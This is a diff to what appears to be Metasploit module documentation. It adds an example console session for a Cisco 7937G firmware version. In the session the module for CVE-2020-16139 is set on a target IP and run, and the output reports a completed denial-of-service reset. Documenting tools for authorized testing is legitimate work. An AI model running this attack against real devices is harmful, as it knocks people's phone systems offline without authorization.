@@ -31,3 +31,16 @@ msf5 auxiliary(dos/cisco/cve_2020_16139) > run
 [*] 192.168.110.209 - DoS reset attack completed!
 [*] Auxiliary module execution completed
 ```
+
+### Cisco 7937G Running Firmware Version SCCP-1-4-5-5
+```
+msf5 > use auxiliary/dos/cisco/cve_2020_16139
+msf5 auxiliary(dos/cisco/cve_2020_16139) > set rhost 192.168.110.209
+rhost => 192.168.110.209
+msf5 auxiliary(dos/cisco/cve_2020_16139) > run
+
+[*] Starting server...
+[*] 192.168.110.209 - Sending DoS Packets. Stand by.
+[*] 192.168.110.209 - DoS reset attack completed!
+[*] Auxiliary module execution completed
+```
